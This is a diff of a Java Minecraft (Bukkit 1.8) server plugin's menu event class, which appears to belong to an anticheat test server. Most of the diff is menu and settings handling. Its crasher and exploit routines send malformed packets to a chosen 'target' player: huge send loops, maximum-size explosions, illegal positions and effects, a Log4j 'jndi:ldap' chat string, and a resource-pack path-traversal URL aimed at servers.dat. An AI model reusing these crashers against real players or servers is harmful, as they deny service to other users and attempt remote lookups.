@@ -1,41 +1,51 @@
 package me.killstorm103.Rebug.Events;
 
 import java.util.ArrayList;
+import java.util.Map;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import org.bukkit.Location;
 import org.bukkit.Material;
-import org.bukkit.command.CommandSender;
+import org.bukkit.Sound;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.inventory.InventoryClickEvent;
-import org.bukkit.inventory.Inventory;
+import org.bukkit.event.inventory.InventoryCloseEvent;
+import org.bukkit.event.inventory.InventoryType;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.potion.PotionEffect;
+import org.bukkit.potion.PotionEffectType;
 
+import com.github.retrooper.packetevents.PacketEvents;
+import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerWorldBorder;
 
+import ac.grim.grimac.api.GrimAbstractAPI;
+import ac.grim.grimac.api.GrimUser;
 import io.netty.buffer.Unpooled;
-import me.killstorm103.Rebug.Commands.Menu;
 import me.killstorm103.Rebug.Main.Rebug;
+import me.killstorm103.Rebug.Tasks.ResetScaffoldTestArea;
 import me.killstorm103.Rebug.Utils.PT;
+import me.killstorm103.Rebug.Utils.TeleportUtils;
 import me.killstorm103.Rebug.Utils.User;
 import net.minecraft.server.v1_8_R3.BlockPosition;
 import net.minecraft.server.v1_8_R3.ChatComponentText;
-import net.minecraft.server.v1_8_R3.EnumDirection;
+import net.minecraft.server.v1_8_R3.EntityPlayer;
 import net.minecraft.server.v1_8_R3.EnumParticle;
 import net.minecraft.server.v1_8_R3.MobEffect;
-import net.minecraft.server.v1_8_R3.Packet;
 import net.minecraft.server.v1_8_R3.PacketDataSerializer;
 import net.minecraft.server.v1_8_R3.PacketPlayOutBed;
 import net.minecraft.server.v1_8_R3.PacketPlayOutChat;
 import net.minecraft.server.v1_8_R3.PacketPlayOutCollect;
 import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
 import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
+import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
 import net.minecraft.server.v1_8_R3.PacketPlayOutEntityStatus;
 import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
 import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;
+import net.minecraft.server.v1_8_R3.PacketPlayOutNamedEntitySpawn;
+import net.minecraft.server.v1_8_R3.PacketPlayOutPlayerInfo;
 import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
 import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;
 import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
@@ -44,42 +54,41 @@ import net.minecraft.server.v1_8_R3.Vec3D;
 
 public class EventMenus implements Listener
 {
-	private Packet<?> packet = null;
-	@SuppressWarnings("unused")
-	private Location position;
-	private void CrashSendPacket (CommandSender sender, Player player, String mode, String spawncrashmode)
+	private void CrashSendPacket (Player attacker, Player target, String mode, String spawncrashmode)
 	{
-		packet = null;
-		position = player.getLocation();
+		if (attacker == null || target == null) return;
+		
 		if (mode.equalsIgnoreCase("Server")) // Test in dev
 		{
-			packet = new PacketPlayOutCollect(player.getEntityId(), Integer.MAX_VALUE);
 			for (int i = 0; i < Integer.MAX_VALUE; i ++)
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "trying Server Crasher!");
+			PT.SendPacket(target, new PacketPlayOutCollect(target.getEntityId(), Integer.MAX_VALUE));
+			PT.Log(attacker, "trying Server Crasher!");
+			return;
 		}
 		if (mode.equalsIgnoreCase("Test"))
 		{
+			WrapperPlayServerWorldBorder p = new WrapperPlayServerWorldBorder(target.getLocation().getX(), target.getLocation().getBlockZ());
+			PacketEvents.getAPI().getPlayerManager().sendPacket(target, p);
+			/*
 			ItemStack item = Reset(new ItemStack(Material.ANVIL, 1));
 			itemMeta.setDisplayName(ChatColor.DARK_RED + "Crash Anvil!");
 			item.setItemMeta(itemMeta);
 			player.setItemInHand(item);
 			player.updateInventory();
 			PT.PlaceItem(player, player.getItemInHand(), new BlockPosition(player.getLocation().getBlockX(), player.getLocation().getBlockY(), player.getLocation().getBlockZ()), EnumDirection.UP, .5F, 0F, .5F);
-			PT.Log(sender, "tried crashing " + player.getName());
+			
+			*/
+			PT.Log(attacker, "tried crashing " + target.getName() + " with test");
+			return;
 		}
 		if (mode.equalsIgnoreCase("NumbWare"))
 		{
-			packet = new PacketPlayOutCustomPayload("NWS|Crash Bed",
-		    new PacketDataSerializer(Unpooled.buffer()));
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "tried crashing " + player.getName());
+			PT.SendPacket(target, new PacketPlayOutCustomPayload("NWS|Crash Bed",
+				    new PacketDataSerializer(Unpooled.buffer())));
 		}
 		if (mode.equalsIgnoreCase("Explosion"))
 		{
-            packet = new PacketPlayOutExplosion(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ()));
-            PT.SendPacket(player, packet);
-            PT.Log(sender, "tried crashing " + player.getName());
+            PT.SendPacket(target, new PacketPlayOutExplosion(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ())));
 		}
 		if (mode.equalsIgnoreCase("Particle"))
 		{
@@ -87,89 +96,86 @@ public class EventMenus implements Listener
 			
             for (int i = 0; i < EnumParticle.values().length; i ++)
             {
-            	packet = new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0});
-                PT.SendPacket(player, packet);
+                PT.SendPacket(target, new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0}));
             }
-            PT.Log(sender, "tried crashing " + player.getName());
 		}
 		if (mode.equalsIgnoreCase("GameState"))
 		{
-			packet = new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500)));
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "tried crashing " + player.getName());
+			PT.SendPacket(target, new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500))));
 		}
 		if (mode.equalsIgnoreCase("Log4j"))
 		{
 			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
 			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
-			packet = new PacketPlayOutChat (text, (byte) 1);
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "Tried using the Log4j Crash Exploit on " + player.getName());
+			PT.SendPacket(target, new PacketPlayOutChat (text, (byte) 1));
 		}
 		if (mode.equalsIgnoreCase("illegal Position"))
 		{
 			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
 			{
-				packet = new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i));
-				PT.SendPacket(player, packet);
+				PT.SendPacket(target, new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i)));
 			}
-			PT.Log(sender, "tried crashing " + player.getName());
 		}
 		if (mode.equalsIgnoreCase("illegal Effect"))
 		{
-			PT.Log(sender, "trying to use illegal Effect crash Exploit on " + player.getName());
-			packet = new PacketPlayOutEntityEffect (player.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true));
 			for (int i = 0; i < Integer.MAX_VALUE; i++)
-				PT.SendPacket(player, packet);
+				PT.SendPacket(target, new PacketPlayOutEntityEffect (target.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true)));
 			
 		}
 		if (mode.equalsIgnoreCase("SpawnEntity"))
 		{
-			PT.CrashPlayer(sender, player, spawncrashmode);
-			PT.Log(sender, "tried crashing " + player.getName());
+			PT.CrashPlayer(attacker, target, spawncrashmode);
+			PT.Log(attacker, Rebug.RebugMessage + "tried using the " + mode + " " + spawncrashmode + " Crash Exploit on " + target.getName());
+			return;
 		}
-		
-		
 		if (mode.equalsIgnoreCase("ResourcePack"))
 		{
-			packet = new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat");
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "tried using the ResourcePack Crash Exploit on " + player.getName());
+			PT.SendPacket(target, new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat"));
 		}
+		PT.Log(attacker, Rebug.RebugMessage + "tried using the " + mode + " Crash Exploit on " + target.getName());
 	}
-	private void ExploitSendPacket (CommandSender sender, Player player, String exploit)
+	private void ExploitSendPacket (Player attcter, Player target, String exploit)
 	{
+		if (attcter == null || target == null) return;
+		User user = Rebug.getUser(target);
+		if (user == null) return;
+		EntityPlayer px = PT.getEntityPlayer(target);
+		if (px == null) return;
+		
 		if (exploit.equalsIgnoreCase("ResourcePack"))
 		{
-			
-			//packet = new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat");
-			//PT.SendPacket(player, packet);
-			player.setResourcePack("level://../servers.dat");
-			PT.Log(sender, "tried using the ResourcePack exploit on " + player.getName());
+			target.setResourcePack("level://../servers.dat");
 		}
 		if (exploit.equalsIgnoreCase("force sleep"))
 		{
-			packet = new PacketPlayOutBed(PT.getEntityPlayer(player), new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "tried using the Force Sleep exploit on " + player.getName());
+			PT.SendPacket(target, new PacketPlayOutBed(PT.getEntityPlayer(target), new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
 		}
 		if (exploit.equalsIgnoreCase("demo"))
 		{
-			packet = new PacketPlayOutGameStateChange(5, 0);
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "tried using the Demo exploit on " + player.getName());
+			PT.SendPacket(target, new PacketPlayOutGameStateChange(5, 0));
 		}
 		if (exploit.equalsIgnoreCase("fake death")) 
 		{
-			packet = new PacketPlayOutEntityStatus(PT.getEntityPlayer(player), (byte) 3);
-			PT.SendPacket(player, packet);
-			PT.Log(sender, "tried using the Fake Death exploit on " + player.getName());
+			PT.SendPacket(target, new PacketPlayOutEntityStatus(PT.getEntityPlayer(target), (byte) 3));
 		}
 		if (exploit.equalsIgnoreCase("Test"))
 		{
-			//player.openInventory(PT.createInventory(player, InventoryType.CREATIVE, "Penis"));
-			PT.Log(sender, "tried using the test exploit on " + player.getName());
+			TeleportUtils.GenerateCrashLocation(target);
 		}
+		if (exploit.equalsIgnoreCase("Spawn Player"))
+		{
+			user.CancelInteract = true;
+			user.Exterranl_Damage = false;
+			user.FallDamage = false;
+			user.Hunger = false;
+			target.setNoDamageTicks(Integer.MAX_VALUE);
+			px.setInvisible(true);
+			PT.SendPacket(target, new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, px));
+			PT.SendPacket(target, new PacketPlayOutEntityMetadata(px.getId(), px.getDataWatcher(), true));
+			PT.SendPacket(target, new PacketPlayOutNamedEntitySpawn(PT.getEntityHuman(target)));
+		}
+		
+		PT.Log(attcter, Rebug.RebugMessage + "tried using the " + exploit + " Exploit on " + target.getName());
 	}
 	
 	public void Command (String command)
@@ -179,19 +185,6 @@ public class EventMenus implements Listener
 	public void Command (Player sender, String command)
 	{
 		Bukkit.dispatchCommand(sender, "rebug " + command);
-	}
-	private ArrayList<String> lore = new ArrayList<>();
-	private ItemMeta itemMeta = null;
-	private ItemStack item = null;
-	
-	private ItemStack Reset (ItemStack item)
-	{
-		this.item = (ItemStack) (this.itemMeta =  null);
-		lore.clear();
-		this.item = item;
-		itemMeta = this.item.getItemMeta();
-		
-		return this.item;
 	}
 	private void Refresh (Player player, String menu)
 	{
@@ -204,22 +197,75 @@ public class EventMenus implements Listener
             }
         }, 0L);
 	}
-	
+	/*
+	@EventHandler
+	public void onOpenGui (InventoryOpenEvent e)
+	{
+		User user = Rebug.getUser((Player) e.getView().getPlayer());
+		if (user == null || user.CommandTarget == null) return;
+		
+	}
+	*/
+	@EventHandler
+	public void onInventoryClose (InventoryCloseEvent e)
+	{
+		User user = Rebug.getUser((Player) e.getPlayer());
+		if (user == null || user.CommandTarget == null) return;
+		
+		if (user.InvSeed)
+		{
+			for (Map.Entry<ItemStack, Integer> map : user.OldItems.entrySet())
+			{
+				if (map == null || map.getKey() == null) return;
+				
+				if (map.getKey().getType() == Material.AIR)
+					user.getPlayer().getInventory().getItem(map.getValue()).setType(Material.AIR);
+				else
+					user.getPlayer().getInventory().setItem(map.getValue(), map.getKey());
+			}
+			user.getPlayer().updateInventory();
+			user.OldItems.clear();
+			user.InvSeed = false;
+		}
+	}
 	@SuppressWarnings("deprecation")
 	@EventHandler
 	public void onMenu (InventoryClickEvent e)
 	{
 		ItemMeta meta = null;
 		String MenuName = ChatColor.stripColor(e.getView().getTitle());
-		Inventory inventory = null;
 		ItemStack item = e.getCurrentItem(), getCursor = e.getCursor();
+		Player player = (Player) e.getView().getPlayer();
+		int slot = e.getSlot();
+		if (Rebug.debug)
+		{
+			Rebug.Debug(player, "slot= " + slot + " item= " + item + " ItemName= " +  ChatColor.stripColor(item.getItemMeta().getDisplayName()) + " Menu= " + MenuName);
+		}
+		if ((e.getInventory().getType() == InventoryType.ENCHANTING || e.getInventory().getType() == InventoryType.ANVIL) && !player.isOp() && !player.hasPermission("me.killstorm103.rebug.server_owner") && !player.hasPermission("me.killstorm103.rebug.server_admin"))
+		{
+			e.setCancelled(true);
+			player.sendMessage(Rebug.RebugMessage + "You can't do that you don't have perms!");
+			return;
+		}
 		if (MenuName != null)
 		{
-			if (e.getClickedInventory() != e.getWhoClicked().getInventory() && item != null && MenuName.equalsIgnoreCase("Items") && item.getType() == Material.WOOL && item.getData().getData() == 14 && getCursor != null)
+			if (e.getClickedInventory() != e.getWhoClicked().getInventory() && item != null && MenuName.equalsIgnoreCase("Items") && item.getType() == Material.WOOL && getCursor != null)
 			{
-				e.setCursor(null);
-				e.setCancelled(true);
-				return;
+				if (item.hasItemMeta() && item.getItemMeta().hasDisplayName())
+				{
+					if (ChatColor.stripColor(item.getItemMeta().getDisplayName()).equalsIgnoreCase("delete item!") && getCursor.getType() != Material.AIR)
+					{
+						e.setCursor(null);
+						e.setCancelled(true);
+						return;
+					}
+					if (ChatColor.stripColor(item.getItemMeta().getDisplayName()).equalsIgnoreCase("Debug item!") && getCursor.getType() != Material.AIR)
+					{
+						player.sendMessage(Rebug.RebugMessage + "Debug= " + getCursor);
+						e.setCancelled(true);
+						return;
+					}
+				}
 			}
 			if (e.getClickedInventory() != e.getWhoClicked().getInventory() && item != null && (MenuName.equalsIgnoreCase("Items") || MenuName.equalsIgnoreCase("Crashers") || MenuName.equalsIgnoreCase("Exploits")) && item.getType() == Material.STAINED_GLASS_PANE)
 			{
@@ -227,165 +273,264 @@ public class EventMenus implements Listener
 				return;
 			}
 		}
-		if (MenuName != null && e.getView().getPlayer() != null)
+		if (MenuName != null)
 		{
-			if (e.getCurrentItem() != null && e.getCurrentItem().getItemMeta() != null)
+			User user = Rebug.getUser((Player) e.getView().getPlayer()), BackUser;
+			if (user == null)
 			{
-				meta = e.getCurrentItem().getItemMeta();
-				String ItemName = ChatColor.stripColor(meta.getDisplayName());
-				Player player = (Player) e.getView().getPlayer();
-				User user = Rebug.getUser(player);
-				if (user == null)
+				PT.KickPlayer((Player) e.getView().getPlayer(), PT.RebugsUserWasNullErrorMessage("in " + MenuName));
+				return;
+			}
+			BackUser = user;
+			if (item != null && item.getItemMeta() != null)
+			{
+				meta = item.getItemMeta();
+				String ItemName = meta.hasDisplayName() ? ChatColor.stripColor(meta.getDisplayName()) : null;
+				if (MenuName.equalsIgnoreCase("Inventory") && user.InvSeed && e.getClickedInventory() == user.getPlayer().getInventory())
 				{
-					PT.KickPlayer(player, PT.RebugsUserWasNullErrorMessage("in " + MenuName));
-					return;
-				}
-				if (MenuName.equalsIgnoreCase("Exploits"))
-				{
-					if (ItemName != null)
+					if (e.getClickedInventory() != user.CommandTarget.getInventory())
 					{
-						ExploitSendPacket(Menu.sender, Menu.player, ItemName);
-						e.setCancelled(true);
-					}
-				}
-				if (MenuName.equalsIgnoreCase("Vanilla Fly Checks"))
-				{
-					if (e.getClickedInventory() != player.getInventory())
-					{
-						e.setCancelled(true);
-						if (item != null && ItemName != null && item.getType() != Material.STAINED_GLASS_PANE)
+						if (ItemName.equalsIgnoreCase("Max Item"))
 						{
-							if (ItemName.equalsIgnoreCase("Back"))
-							{
-								Refresh(player, "menu settings");
-								return;
-							}
-							if (ItemName.equalsIgnoreCase("1.8.x"))
-							{
-								user.setVanilla1_8FlyCheck(!user.isVanilla1_8FlyCheck());
-							}
-							if (ItemName.equalsIgnoreCase("1.9+"))
-							{
-								user.setVanilla1_9FlyCheck(!user.isVanilla1_9FlyCheck());
-							}
-							Refresh(player, "menu VanillaFlyChecks");
+							e.setCancelled(true);
+							e.getCursor().setAmount(64);
+							e.setCursor(e.getCursor());
 						}
-						
+						if (ItemName.equalsIgnoreCase("Delete Item"))
+						{
+							e.setCancelled(true);
+							e.setCursor(null);
+						}
 					}
 				}
-				if (MenuName.equalsIgnoreCase("Rebug Settings") && (player.hasPermission("me.killstorm103.rebug.server_owner") || player.hasPermission("me.killstorm103.rebug.server_admin")) && e.getClickedInventory() != player.getInventory())
+				
+				if (MenuName.equalsIgnoreCase("AntiCheats") && e.getClickedInventory() != user.getPlayer().getInventory())
+				{
+					e.setCancelled(true);
+					if (item == null || !item.hasItemMeta() || item.getItemMeta().getLore() == null || item.getItemMeta().getLore().size() <= 1 || ItemName.equalsIgnoreCase("User " + user.getPlayer().getName()))
+						return;
+				
+					final String command = Rebug.getGetMain().getConfig().getString("user-update-perms-command").replace("%user%", user.getPlayer().getName()).replace("%anticheat%", ItemName);
+					Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
+					if (user.AutoCloseAntiCheatMenu)
+						user.getPlayer().closeInventory();
+					
+					
+					// Make update perms?
+					GrimAbstractAPI grim_api = Rebug.getGrimAC();
+					if (grim_api != null)
+					{
+						GrimUser grim_user = grim_api.getGrimUser(user.getPlayer());
+						if (grim_user != null)
+							grim_user.updatePermissions();
+						
+						grim_api.reload();
+					}
+					
+					Bukkit.getScheduler().runTaskLater(Rebug.getGetMain(), new Runnable()
+					{
+						
+						@Override
+						public void run()
+						{
+							user.AntiCheat = ItemName;
+							ShowFlags (user);
+							Rebug.UpdateScoreBoard(user, 2, ChatColor.DARK_RED + "AC " + user.getColoredAntiCheat());
+							PT.PlaySound(user.getPlayer(), Sound.ANVIL_USE, 1, 1);
+							String AC = ChatColor.stripColor(user.AntiCheat);
+							user.getPlayer().sendMessage(Rebug.RebugMessage + "You selected: " + AC + (AC.equalsIgnoreCase("vanilla") ||
+							AC.equalsIgnoreCase("nocheatplus") ? "" : " " + ChatColor.stripColor(PT.SubString(item.getItemMeta().getLore().get(3), 10,
+							item.getItemMeta().getLore().get(3).length()).replace(" ", ""))));
+						}
+					}, 15);
+				}
+				if (MenuName.equalsIgnoreCase("Exploits") && e.getClickedInventory() != user.getPlayer().getInventory() && ItemName != null)
+				{
+					e.setCancelled(true);
+					if (!ItemName.equalsIgnoreCase("User " + user.getPlayer().getName()))
+						ExploitSendPacket(user.getPlayer(), user.CommandTarget, ItemName);
+				}
+				if (MenuName.equalsIgnoreCase("Vanilla Fly Checks") && e.getClickedInventory() != user.getPlayer().getInventory())
+				{
+					e.setCancelled(true);
+					if (item != null && ItemName != null && item.getType() != Material.STAINED_GLASS_PANE)
+					{
+						if (ItemName.equalsIgnoreCase("Back"))
+						{
+							Refresh(user.getPlayer(), "menu settings");
+							return;
+						}
+						if (ItemName.equalsIgnoreCase("1.8.x"))
+							user.Vanilla1_8FlyCheck =! user.Vanilla1_8FlyCheck;
+						
+						if (ItemName.equalsIgnoreCase("1.9+"))
+							user.Vanilla1_9FlyCheck =! user.Vanilla1_9FlyCheck;
+						
+						e.setCurrentItem(user.getMadeItems (MenuName, ItemName));
+					}
+				}
+				if (MenuName.equalsIgnoreCase("Rebug Settings") && (user.getPlayer().isOp() || user.getPlayer().hasPermission("me.killstorm103.rebug.server_owner") || user.getPlayer().hasPermission("me.killstorm103.rebug.server_admin")) && e.getClickedInventory() != user.getPlayer().getInventory())
 				{
 					e.setCancelled(true);
 					
 					if (item != null && ItemName != null && !ItemName.equalsIgnoreCase("Add more Settings as i think of them!"))
 					{
+						if (ItemName.equalsIgnoreCase("back"))
+						{
+							Refresh(user.getPlayer(), "menu settings");
+							return;
+						}
 						if (ItemName.equalsIgnoreCase("Debug"))
 							Rebug.debug =! Rebug.debug;
 						
 						if (ItemName.equalsIgnoreCase("Debug To Ops Only"))
 						{
 							Rebug.debugOpOnly =! Rebug.debugOpOnly;
-							if (Rebug.debugOpOnly && (!player.hasPermission("me.killstorm103.rebug.server_owner") || !player.hasPermission("me.killstorm103.rebug.server_admin") || !player.isOp()))
-								player.sendMessage(Rebug.RebugMessage + "Warning your not opped so you won't get debug messages!");
 						}
-						
+						if (ItemName.equalsIgnoreCase("Reset Scaffold Area"))
+						{
+							Rebug.getGetMain().RestScaffoldTask.cancel();
+							ResetScaffoldTestArea.getMainTask().run();
+							return;
+						}
+						if (ItemName.equalsIgnoreCase("Kick on reload config"))
+						{
+							Rebug.KickOnReloadConfig =! Rebug.KickOnReloadConfig;
+						}
 						if (ItemName.equalsIgnoreCase("Reload Config"))
 						{
-							try
+							Rebug.getGetMain().Reload_Configs();
+							Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Successfully Reloaded Config!");
+							if (Rebug.KickOnReloadConfig)
 							{
-								Rebug.getGetMain().getConfig().load(Rebug.getGetMain().getCustomConfigFile());
-								Rebug.getGetMain().getConfig().save(Rebug.getGetMain().getCustomConfigFile());
-								player.sendMessage(Rebug.RebugMessage + "Successfully Reloaded Config!");
+								for (Player players : Bukkit.getOnlinePlayers())
+								{
+									PT.KickPlayer(players, ChatColor.DARK_RED + "Rejoin reloading Rebug's Config!");
+								}
 							}
-							catch (Exception fG) 
-							{
-								fG.printStackTrace();
-							}
+							else
+								user.getPlayer().sendMessage(Rebug.RebugMessage + "Successfully Reloaded Config!");
 						}
 						else
-							Refresh(player, "menu " + (ItemName.equalsIgnoreCase("Back") ? "settings" : "Rebug_Settings"));
+							user.UpdateItemInMenu(user.getRebugSettingsMenu, slot, user.getMadeItems(MenuName, ItemName));
 					}
 				}
 				if (MenuName.equalsIgnoreCase("Player Settings"))
 				{
-					if (e.getClickedInventory() != player.getInventory())
+					if (e.getClickedInventory() != user.getPlayer().getInventory())
 					{
 						e.setCancelled(true);
-						if (item != null && ItemName != null && !ItemName.equalsIgnoreCase("Add more Settings as i think of them!"))
+						if (ItemName != null && !ItemName.equalsIgnoreCase("Add more Settings as i think of them!"))
 						{
 							if (ItemName.equalsIgnoreCase("Rebug Settings"))
 							{
-								Refresh(player, "menu Rebug_Settings");
+								Refresh(user.getPlayer(), "menu Rebug%Settings");
 								return;
 							}
 							if (ItemName.equalsIgnoreCase("Hunger"))
 							{
-								user.setEats (!user.isEats());
+								user.Hunger =! user.Hunger;
 							}
 							if (ItemName.equalsIgnoreCase("Fall Damage"))
 							{
-								user.setFallDamage(!user.FallDamage());
+								user.FallDamage =! user.FallDamage;
 							}
 							if (ItemName.equalsIgnoreCase("Exterranl Damage"))
 							{
-								user.setDamageable(!user.isDamageable());
+								user.Exterranl_Damage =! user.Exterranl_Damage;
+							}
+							if (ItemName.equalsIgnoreCase("Damage Resistance"))
+							{
+								user.Damage_Resistance =! user.Damage_Resistance;
+								if (user.Damage_Resistance)
+									user.getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, Integer.MAX_VALUE, 3, true, false));
+								else
+									user.getPlayer().removePotionEffect(PotionEffectType.DAMAGE_RESISTANCE);
+							}
+							if (ItemName.equalsIgnoreCase("Fire Resistance"))
+							{
+								user.Fire_Resistance =! user.Fire_Resistance;
+								if (user.Fire_Resistance)
+									user.getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, Integer.MAX_VALUE, 0, true, false));
+								else
+									user.getPlayer().removePotionEffect(PotionEffectType.FIRE_RESISTANCE);
+							}
+							if (ItemName.equalsIgnoreCase("Infinite Blocks"))
+							{
+								if (user.getPlayer().hasPermission("me.killstorm103.rebug.user.infinite_blocks") || user.getPlayer().isOp() || user.getPlayer().hasPermission("me.killstorm103.rebug.server_owner") || user.getPlayer().hasPermission("me.killstorm103.rebug.server_admin"))
+									user.Infinite_Blocks =! user.Infinite_Blocks;
+								else
+								{
+									user.getPlayer().sendMessage(Rebug.RebugMessage + "You don't have Permission to use this!");
+									return;
+								}
 							}
 							if (ItemName.equalsIgnoreCase("Vanilla Fly Checks"))
 							{
-								Command(player, "menu VanillaFlyChecks");
+								Command(user.getPlayer(), "menu Vanilla%Fly%Checks");
 								return;
 							}
 							if (ItemName.equalsIgnoreCase("Potions"))
 							{
-								user.setPotionEffects(!user.isPotionEffects());
+								user.PotionEffects =! user.PotionEffects;
 							}
 							if (ItemName.equalsIgnoreCase("Auto Refill Blocks"))
 							{
-								user.setAutoRefillBlocks(!user.isAutoRefillBlocks());
+								user.AutoRefillBlocks =! user.AutoRefillBlocks;
 							}
 							if (ItemName.equalsIgnoreCase("Notify On Flying Kick"))
 							{
-								user.setNotifyFlyingKick(!user.isNotifyFlyingKick());
+								user.NotifyFlyingKick =! user.NotifyFlyingKick;
+							}
+							if (ItemName.equalsIgnoreCase("Proximity Player Hider"))
+							{
+								user.ProximityPlayerHider =! user.ProximityPlayerHider;
 							}
 							if (ItemName.equalsIgnoreCase("AllowAT"))
 							{
-								user.setMentions(!user.Mentions());
+								user.AllowAT =! user.AllowAT;
 							}
 							if (ItemName.equalsIgnoreCase("Flags"))
 							{
-								user.setShowFlags(!user.isShowFlags());
+								user.ShowFlags =! user.ShowFlags;
+								ShowFlags(user);
 							}
 							if (ItemName.equalsIgnoreCase("Kick"))
 							{
-								user.setKickable(!user.isKickable());
+								user.AntiCheatKick =! user.AntiCheatKick;
 							}
 							if (ItemName.equalsIgnoreCase("Hide All Online Players"))
 							{
-								user.setHideOnlinePlayers(!user.HideOnlinePlayers());
+								user.HideOnlinePlayers =! user.HideOnlinePlayers;
 							}
 							if (ItemName.equalsIgnoreCase("Direct Messages"))
 							{
-								user.setAllowDirectMessages(!user.AllowDirectMessages());
+								user.AllowDirectMessages =! user.AllowDirectMessages;
 							}
-							Refresh(player, "menu settings");
+							if (ItemName.equalsIgnoreCase("Auto Close AntiCheats Menu"))
+							{
+								user.AutoCloseAntiCheatMenu =! user.AutoCloseAntiCheatMenu;
+							}
+							user.UpdateMenuValueChangeLore(user.SettingsMenu, slot, 0, user.getValues ("Player Settings", ItemName));
 						}
 					}
 				}
 				if (MenuName.equalsIgnoreCase("Items"))
 				{
-					if (e.getClickedInventory() != player.getInventory()) 
+					if (e.getClickedInventory() != user.getPlayer().getInventory()) 
 					{
 						e.setCancelled(true);
-						if (PT.isInventoryFull(player))
+						if (PT.isInventoryFull(user.getPlayer()))
 						{
-							player.sendMessage(Rebug.RebugMessage + "Your Inventory's full make some space!");
+							user.getPlayer().sendMessage(Rebug.RebugMessage + "Your Inventory's full make some space!");
 							return;
 						}
-						for (int i = 0; i < player.getInventory().getSize(); i ++)
+						for (int i = 0; i < user.getPlayer().getInventory().getSize(); i ++)
 						{
-							if (player.getInventory().getItem(i) == null || player.getInventory().getItem(i) == item && item.getAmount() < item.getMaxStackSize())
+							ItemStack InventoryItem = user.getPlayer().getInventory().getItem(i);
+							if (InventoryItem == null)
 							{
-								player.getInventory().setItem(i, item);
+								user.getPlayer().getInventory().setItem(i, item);
 								break;
 							}
 						}
@@ -395,71 +540,76 @@ public class EventMenus implements Listener
 				{
 					if (ItemName != null)
 					{
-						if (!player.isOp() && ItemName.equalsIgnoreCase("illegal Effect"))
+						if (ItemName.equalsIgnoreCase("User " + user.getPlayer().getName()))
 						{
-							player.sendMessage("because this crashes the server to you have to Opped to use it!");
 							e.setCancelled(true);
 							return;
 						}
+						if (!user.getPlayer().isOp() && ItemName.equalsIgnoreCase("illegal Effect"))
+						{
+							user.getPlayer().sendMessage("because this crashes the server to you have to be Opped to use it!");
+							e.setCancelled(true);
+							return;
+						}
